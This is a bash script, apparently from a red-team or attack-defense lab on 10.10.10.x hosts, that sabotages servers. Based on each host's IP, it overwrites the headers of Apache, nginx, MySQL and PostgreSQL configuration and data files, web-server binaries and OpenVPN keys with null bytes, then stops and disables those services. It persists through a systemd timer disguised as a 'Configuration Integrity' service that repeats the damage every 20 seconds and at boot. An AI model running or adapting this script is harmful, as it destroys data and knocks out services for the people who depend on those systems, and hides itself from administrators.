#!/bin/bash
# service_corrupt_sysd.sh

cat > /usr/local/bin/service_corrupt.sh << 'SCRIPT'
#!/bin/bash

corrupt_file() {
    local f="$1"
    if [ -f "$f" ] && [ -w "$f" ]; then
        printf '\x00\x00\x00\x00\x00\x00\x00\x00' | dd of="$f" bs=1 seek=0 conv=notrunc 2>/dev/null
    fi
}

MY_IP=$(hostname -I | awk '{print $1}')

case "$MY_IP" in
    "10.10.10.101")
        corrupt_file "/etc/apache2/apache2.conf"
        corrupt_file "/etc/apache2/ports.conf"
        corrupt_file "/etc/apache2/envvars"
        corrupt_file "/etc/nginx/nginx.conf"
        corrupt_file "/etc/httpd/conf/httpd.conf"
        corrupt_file "/usr/sbin/apache2"
        corrupt_file "/usr/sbin/nginx"
        corrupt_file "/usr/sbin/httpd"
        systemctl stop apache2 nginx httpd 2>/dev/null
        systemctl disable apache2 nginx httpd 2>/dev/null
        ;;
    "10.10.10.102")
        corrupt_file "/etc/mysql/mysql.conf.d/mysqld.cnf"
        corrupt_file "/etc/mysql/my.cnf"
        corrupt_file "/var/lib/mysql/ibdata1"
        corrupt_file "/var/lib/mysql/ib_logfile0"
        corrupt_file "/var/lib/mysql/ib_logfile1"
        corrupt_file "/etc/postgresql/14/main/postgresql.conf"
        corrupt_file "/etc/postgresql/15/main/postgresql.conf"
        corrupt_file "/etc/postgresql/14/main/pg_hba.conf"
        corrupt_file "/etc/postgresql/15/main/pg_hba.conf"
        systemctl stop mysql mariadb postgresql 2>/dev/null
        systemctl disable mysql mariadb postgresql 2>/dev/null
        ;;
    "10.10.10.103")
        # SCP-OPENSSH-01 - DO NOT TOUCH
        ;;
    "10.10.10.104")
        corrupt_file "/etc/openvpn/server.conf"
        corrupt_file "/etc/openvpn/ca.crt"
        corrupt_file "/etc/openvpn/server.crt"
        corrupt_file "/etc/openvpn/server.key"
        corrupt_file "/etc/openvpn/dh.pem"
        corrupt_file "/etc/openvpn/dh2048.pem"
        corrupt_file "/etc/openvpn/ta.key"
        systemctl stop openvpn openvpn@server openvpn-server@server 2>/dev/null
        systemctl disable openvpn openvpn@server openvpn-server@server 2>/dev/null
        ;;
    *)
        corrupt_file "/etc/apache2/apache2.conf"
        corrupt_file "/etc/nginx/nginx.conf"
        corrupt_file "/etc/mysql/my.cnf"
        corrupt_file "/var/lib/mysql/ibdata1"
        corrupt_file "/etc/postgresql/14/main/postgresql.conf"
        corrupt_file "/etc/postgresql/15/main/postgresql.conf"
        corrupt_file "/etc/openvpn/server.conf"
        systemctl stop apache2 nginx mysql mariadb postgresql openvpn 2>/dev/null
        systemctl disable apache2 nginx mysql mariadb postgresql openvpn 2>/dev/null
        ;;
esac
SCRIPT

chmod +x /usr/local/bin/service_corrupt.sh
/usr/local/bin/service_corrupt.sh

cat > /etc/systemd/system/svc-corrupt.service << 'UNIT'
[Unit]
Description=System Configuration Integrity Service
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/service_corrupt.sh
RemainAfterExit=no
UNIT

cat > /etc/systemd/system/svc-corrupt.timer << 'UNIT'
[Unit]
Description=System Configuration Integrity Timer

[Timer]
OnBootSec=5
OnUnitActiveSec=20s
AccuracySec=1s

[Install]
WantedBy=timers.target
UNIT

systemctl daemon-reload
systemctl enable svc-corrupt.timer
systemctl start svc-corrupt.timer
